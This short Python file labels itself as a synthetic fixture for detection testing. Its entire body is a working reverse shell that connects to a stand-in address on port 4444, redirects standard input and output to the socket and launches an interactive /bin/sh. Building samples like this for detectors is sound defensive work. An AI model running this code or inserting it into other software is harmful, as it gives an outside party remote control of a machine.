# FIXTURE ONLY - synthetic detection test sample, not real malware
import os
import socket
import subprocess

_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
_s.connect(("192.0.2.10", 4444))
os.dup2(_s.fileno(), 0)
os.dup2(_s.fileno(), 1)
os.dup2(_s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
